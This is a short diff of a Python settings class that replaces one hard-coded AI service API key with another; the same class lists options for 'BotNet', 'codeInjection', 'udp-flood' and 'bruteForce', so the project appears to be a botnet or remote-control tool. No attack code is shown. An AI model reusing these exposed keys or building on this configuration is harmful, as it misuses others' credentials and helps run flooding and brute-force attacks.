@@ -109,7 +109,7 @@ class Setting:
         self.DELAY = 15  # Delay in seconds for instructions
         self.CHECK_UPDATE = ['checked', 'unchecked']
         self.CMD_CONDION = {True: "1", False: "0"}
-        self.API_KEY_AI = "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"
+        self.API_KEY_AI = "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"
         self.INSTRACTION = ['connectToWeb', 'connectBySocket', 'BotNet','codeInjection']
         self.INSTRACTION_TYPE = ['CMD','BotNet','CodeInjection','Web','Socket']
         self.INSTRACTION_BOTNET_CATEGORY = ['udp-flood','bruteForce']
